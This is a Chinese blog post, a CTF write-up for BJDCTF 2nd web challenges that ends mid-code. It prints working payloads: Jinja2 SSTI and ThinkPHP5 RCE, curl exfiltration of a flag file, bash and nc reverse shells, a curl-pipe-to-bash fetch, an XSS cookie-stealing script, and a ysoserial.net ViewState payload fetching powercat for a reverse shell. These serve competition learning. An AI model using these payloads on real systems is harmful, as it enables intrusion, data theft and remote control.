<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BJD2d CTF Web Writeup | 可惜没如果、m0nk3y‘s Blog</title><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="BJD 的web 题挺适合我这种水平的人的, 说不会呢,又会点一点,但是就是差一点东西, 挺好~ 赵师傅的平台在比赛开始的时候要稍微多等一会儿,不过我下午打完球回来就丝滑了… 膜拜这些师傅们!!! Orz 有3个题是今天做的, asp 那个题是我花时间最多的题(三天都在搞,结果差环境,以为只需要下个ysoserial就行了)….  注: 带 # 的表示,是看了一点wp的细节 Redo的 Web[B">
<meta property="og:type" content="article">
<meta property="og:title" content="BJD2d CTF Web Writeup">
<meta property="og:url" content="https://hack-for.fun/3505.html">
<meta property="og:site_name" content="可惜没如果、m0nk3y‘s Blog">
<meta property="og:description" content="BJD 的web 题挺适合我这种水平的人的, 说不会呢,又会点一点,但是就是差一点东西, 挺好~ 赵师傅的平台在比赛开始的时候要稍微多等一会儿,不过我下午打完球回来就丝滑了… 膜拜这些师傅们!!! Orz 有3个题是今天做的, asp 那个题是我花时间最多的题(三天都在搞,结果差环境,以为只需要下个ysoserial就行了)….  注: 带 # 的表示,是看了一点wp的细节 Redo的 Web[B">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hack-for.fun/null">
<meta property="article:published_time" content="2020-03-23T02:37:01.000Z">
<meta property="article:modified_time" content="2020-08-25T08:45:07.301Z">
<meta property="article:author" content="m0nk3y">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hack-for.fun/null"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hack-for.fun/3505"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-08-25 16:45:07'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="可惜没如果、m0nk3y‘s Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div></div><hr/></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">可惜没如果、m0nk3y‘s Blog</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">BJD2d CTF Web Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-03-23T02:37:01.000Z" title="Created 2020-03-23 10:37:01">2020-03-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-08-25T08:45:07.301Z" title="Updated 2020-08-25 16:45:07">2020-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>BJD 的web 题挺适合我这种水平的人的, 说不会呢,又会点一点,但是就是差一点东西, 挺好~ 赵师傅的平台在比赛开始的时候要稍微多等一会儿,不过我下午打完球回来就丝滑了… 膜拜这些师傅们!!! Orz</p>
<p>有3个题是今天做的, asp 那个题是我花时间最多的题(三天都在搞,结果差环境,以为只需要下个ysoserial就行了)…. </p>
<p>注: 带 # 的表示,是看了一点wp的细节 Redo的</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>SSTI, 没什么过滤,tplmap 一把梭</p>
<p>或者找网上现成的payload执行rce</p>
<p>JInja2 通用 RCE Payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;&lt;command&gt;&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>&lt;command&gt;</code> 中添加命令即可,比如这里<code>cat /flag</code> 即可</p>
<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>tp5 RCE poc 一把梭 (不过得抽时间好好学一学tp框架漏洞的原理,写一篇分析文章!  (不知道会鸽到啥时候了哈哈)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;84d1506e-ae51-4c3c-93ee-823174dd4021.node3.buuoj.cn&#x2F;thinkphp5&#x2F;public&#x2F;?s&#x3D;captcha&amp;cmd&#x3D;cat%20&#x2F;flag</span><br><span class="line">POST: _method&#x3D;__construct&amp;filter%5B%5D&#x3D;system&amp;method&#x3D;get</span><br></pre></td></tr></table></figure>

<p>打了一下午篮球,晚上继续搞</p>
<h2 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h2><p>法一(非预期): </p>
<p>直接监听端口,payload打过去一把梭 ,前面做了那么多限制,结果没限制空格和flag… 其实限制了flag 就好玩了~ </p>
<p>POST的数据</p>
<p><code>女朋友=curl -F &#39;flag=@/flag&#39; 174.1.55.32:8383</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200321192237.png"></p>
<p>法二: </p>
<p>后面我给同学说这个怎么做的时候,发现改题了, 利用curl上传flag不行了</p>
<p>nc 反弹shell ,这里因为过滤了<code>&gt;</code> 就不能用bash反弹</p>
<p><code>bash -i &gt;&amp; /dev/tcp/174.1.77.12/1234 0&gt;&amp;1</code> </p>
<p>补充: 看了师傅们的wp ,这里可以吧这个bash shel 写在自己的vps (buu 用内网靶机)上 用curl 来反弹 </p>
<p><code>curl  ip/shell.txt|bash</code> </p>
<p>使用nc 正向连接得到题目靶机ip =&gt; 攻击机(buu内网吧机): <code>nc -lvvp 1234 -e /bin/bash</code></p>
<p>POST 过去一个nc连接 <code>nc 174.1.77.12 1234</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323103011.png"></p>
<p>如图所示,我们得到了题目的ip 为 174.1.77.114 然后 反向shell</p>
<p>post 过去<code> nc -lvvp 1234 -e sh</code> 建立反向shell , 攻击机nc 连接<code> nc 174.1.77.114 1234</code> 然后拿到shell后就是找flag了</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323103910.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323103643.png"></p>
<h2 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h2><p>无回显,应该是盲注了, 先fuzz 一下过滤了那些关键字 ,union 和 select  过滤了就很难受了</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200321195907.png"></p>
<p>先试试大小写绕过, 不行,那么估计是用的正则来处理的黑名单了</p>
<p>绕过关键字过滤还有一点就是等效替换,比如我们这里直接利用注释符</p>
<p>习惯于jio本小子的我, 把目光再次投向了sqlmap…</p>
<p>学了Smi1e 师傅的一篇文章,改一下sqlmap的tamper 也不行… 后来的 ttpfx 交流,他给我说有hint !!!! wdnmd?  访问/hint.txt (后面才知道有robots.txt)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;鍑洪浜哄洓绾у帇绾挎墠杩� 瑙佽皡瑙佽皡 棰嗕細绮剧</span><br><span class="line">乱码恢复一下: &#x2F;&#x2F;出题人四级压线才? 见谅见谅 领会精神</span><br></pre></td></tr></table></figure>

<p>这语句给人第一感觉是要爆破,但是是注入题,那么只能从万能密码考虑了.但是过滤了<code>&#39;</code> 和<code>&quot;</code> 感觉要宽字节: <code>運</code>  但是这里又没有用<code>addslashes</code>函数来处理…我tcl… 后面分享会才知道可以用<code>\</code> 来注释掉<code>&#39;</code>  <code>&#39;admin\&#39;  and password=or 1 #&#39;</code> =&gt; <code> &#39;admin and password= or 1&#39;</code>  (做天下午还一直在想着怎么利用这棘手的条件去构造万能密码)</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323163827.png"></p>
<blockquote>
<p>POST   布尔盲注</p>
</blockquote>
<p>脚本: </p>
<p>脚本还在想 </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200324000407.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200324000658.png"></p>
<p>拿着密码登陆即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200324002221.png"></p>
<h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><p>抓个包来看看: 发现有个注释,访问, 说要99 年后才能访问. 然后发现了cookie字段有一个time,我这里猜测这个时间是以分钟为单位的,然后我就随便弄一个比较大的时间,然后好了,要本地才能访问,XFF被ban了</p>
<p>不知道为什么,我总感觉我的BP 有问题(post 数据的时候,有时候会失灵-.-)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Hint For 假猪套天下第一]</span><br><span class="line">1.XFF过不去，题目要考的字段里不带字母“X”</span><br><span class="line">2.某某64过不去，去查查Google，查查他全称叫什么（划重点：Google） 或者wikipedia</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200322193237.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200322193140.png"></p>
<p>然后根据题目要求,一步步添加header 就行了~</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via</a></p>
<blockquote>
<p><strong>Via</strong> 是一个通用首部，是由代理服务器添加的，适用于正向和反向代理，在请求和响应首部中均可出现。这个消息首部可以用来追踪消息转发情况，防止循环请求，以及识别在请求或响应传递链中消息发送者对于协议的支持能力。</p>
</blockquote>
<p>那个限制localhost 改为 127.0.0.1 就可以了,但是不知道为什么我在bp上改就不行~!</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200322235053.png"></p>
<p>flag 按 F12 在一段注释里面,拿去base64 解码得flag (这里的Commodore 查谷歌的时候细心一点0.0, 不然就会忘记那个re)</p>
<h2 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h2><p>我打完球回来水群看这道题的出题人放了hint</p>
<p>hint: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">多注意cookie   	</span><br><span class="line">最后密码是b站的av号 flag在b站上</span><br></pre></td></tr></table></figure>

<p>搜一下<code>dXNlcg</code> 发现<code>dXNlcg==</code> base64decode后为<code>user</code> 将cookie的值也一起解码: <code>1584812733</code> 然后页面上有一个,那么我们伪造一下试试看1580308166</p>
<p>看源码中说要删除掉 test.php 然后这个页面是个登陆页面, 那么直接把这页面拿来爆破</p>
<p>发现伪造这个成功率只有%70多,我们把改成页面上的<code>imagin@1580308166</code> 经过base64encode, 填入cookie,刷新一下,成功了(这个数据其实应该是时间戳) 只不过我运气比较好, 歪打正着就成功了~ </p>
<p><code>Burst successed! The passwd is av11664517@1583985203.</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200322015438.png"></p>
<p>然后b站翻评论即可找到flag</p>
<h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2><p>扫目录发现git泄露, 下载下来一个index.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure>

<p>xss嘛一般就是跟cookie咯… 把cookie拿去jwt 一看,已经就是admin了,发现群里有hint, 直接把cookie打出去,然后查看cookie,cookie就是flag, 好像有人alert 1 to get flag? 不知道是不是真的…..</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s &#x3D; &#39;&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;f7ffa642-8f7f-4879-bc49-e75d26e7c2bc.node3.buuoj.cn&#x2F;a?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">echo serialize($s);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323000703.png"></p>
<p>后面据说是用php原生类 <code>Exception</code> ,具体看文章</p>
<p><a target="_blank" rel="noopener" href="http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/">http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/</a></p>
<h2 id="BJDCTF-2nd-EasyAspDotNet"><a href="#BJDCTF-2nd-EasyAspDotNet" class="headerlink" title="[BJDCTF 2nd]EasyAspDotNet#"></a>[BJDCTF 2nd]EasyAspDotNet#</h2><p><strong>CVE-2020-0688</strong> (第一天没放hint拿到题就知道了…但是思维太固定了,还是利用搜索引擎的能力太一般了)</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199772">https://www.anquanke.com/post/id/199772</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/173831.html">https://www.freebuf.com/articles/web/173831.html</a></p>
<p>解码网站: <a target="_blank" rel="noopener" href="http://viewstatedecoder.azurewebsites.net/">http://viewstatedecoder.azurewebsites.net/</a></p>
<p>这个漏洞主要是因为这个密钥是静态的: 在web.config 中可以得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">validationkey &#x3D; CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF</span><br><span class="line">validationalg &#x3D; SHA1</span><br></pre></td></tr></table></figure>

<p>,如果知道了用户的登陆ASP.NET_SessionId, 就可以任意伪造viewstate了(因为另外一个参数是直接回显在HTML页面中的),可以造成RCE等严重漏洞, 详细的看360灵腾实验室的文章即可</p>
<p>这里我卡了老半天,只能说自己思维太固定,一直再想怎么去文件包含,虽然后面试了目录穿越, 但是我只试了 <code>../</code> 以及很多个<code>../</code> 的情况. 只能说自己太心急,不明白目录穿越的真正意义</p>
<p>条件1:  得到machineKey中的<code>ValidationKey</code> 和 <code>validationalg</code> </p>
<p>为<code>47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9</code> 和 <code>SHA1</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323005926.png"></p>
<p>条件2: 正常访问得到 <code>__VIEWSTATEGENERATOR</code> 为 <code>CA0B0334</code> </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323010601.png"></p>
<p>使用 <a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a> 可以生成恶意的viewstate payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -f ObjectStateFormatter -c &quot;powershell IEX (New-Object System.Net.Webclient).DownloadString (&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);</span><br><span class="line">powercat -c 174.1.77.12 -p 6666 -e cmd&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</span><br></pre></td></tr></table></figure>

<p>但是我这里没有反弹shell 0.0 wc  不知道是哪里又出问题了 0……0 反正后面反弹shell 了 就谁都会做了 … </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;.&#x2F;System.dll;.&#x2F;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</span><br></pre></td></tr></table></figure>

<p>我终于知道我为什么反弹不了shell了, 因为我的exp 没有下完…我只下了ExploitClass.cs 还有另外两个 dll文件(关于为什么要下载这个dll 文件, 后面看了y1ng 师傅的文章我认为是因为Windows题目靶机是Windows server ,而ysoserial 上只是集成了编码payload的一些环境而已)</p>
<blockquote>
<p>关于需要引入的dll可以在安装了.NET Framework的Windows主机上找到，像我的环境是在这个路径C:\Windows\Microsoft.NET\Framework64\v4.0.30319之中。<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2097.html">https://www.gem-love.com/ctf/2097.html</a></p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323221750.png"></p>
<p>从第一个文件中,可以知道,参数是cmd</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323205432.png"></p>
<p>出题人视角:  <a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6497.html">赵师傅的博客</a></p>
<p><strong>只能说,通过知道题,让我知道了,思维不能太局限于眼前,走出舒适区</strong>(好像我也没什么舒适区)</p>
<h2 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h2><p>存在robots.txt </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;flag.php</span><br><span class="line">Disallow: &#x2F;admin.php</span><br><span class="line">Allow: &#x2F;index.php</span><br></pre></td></tr></table></figure>

<p>访问/flag.php 404 说明flag.php这个文件是不存在的, 要去读本地文件然后去找flag.., 并且上午我就知道了SSRF,后面也放了hint:SSRF 访问 admin.php 说要本地才行, xff 和 client-ip都不行, 估计是有其他地方了,晚上比赛结束放了一大波hint</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hint for web-文件探测]</span><br><span class="line">1.SSRF，不是修改header，不用白浪费精力</span><br><span class="line">2.读完admin.php仔细审代码，随机数是破解不出来的</span><br></pre></td></tr></table></figure>

<p>之前拿到题,不知道怎么做,F12看了有注释,说是继承了第一届的传统… (在header里面放hint)</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323110237.png"></p>
<p>访问<code>home.php</code> URL 长的这样<code>http://8571b1b5-fc65-4237-a992-53800c6a9e21.node3.buuoj.cn/home.php?file=system</code>  把file 改为 admin 和flag , 是存在的, 只是不符合条件, 文件包含一下</p>
<p><code>/home.php?file=php://filter/convert.base64-encode/resource=system</code> 得到system.php 的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filter1 = <span class="string">&#x27;/^http:\/\/127\.0\.0\.1\//i&#x27;</span>;<span class="comment">// 开头必须是 http://127.0.0.1</span></span><br><span class="line">$filter2 = <span class="string">&#x27;/.?f.?l.?a.?g.?/i&#x27;</span>; <span class="comment">// 过滤flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;q1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;q2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;q3&#x27;</span>])) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">&#x27;q2&#x27;</span>] . <span class="string">&quot;.y1ng.txt&quot;</span>;</span><br><span class="line">    $method = $_POST[<span class="string">&#x27;q3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">&quot;~$ python fuck.py -u \&quot;&quot;</span> . $url . <span class="string">&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/^GET/i&#x27;</span>, $method) &amp;&amp; !preg_match(<span class="string">&#x27;/^POST/i&#x27;</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="literal">false</span>); <span class="comment">// 开启了false</span></span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">&quot;$url method&amp;content_size:$method%d&quot;</span>, $detect)); <span class="comment">// %d 表示10进制整数, %s的话,就能输出字符串了,打印出源码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 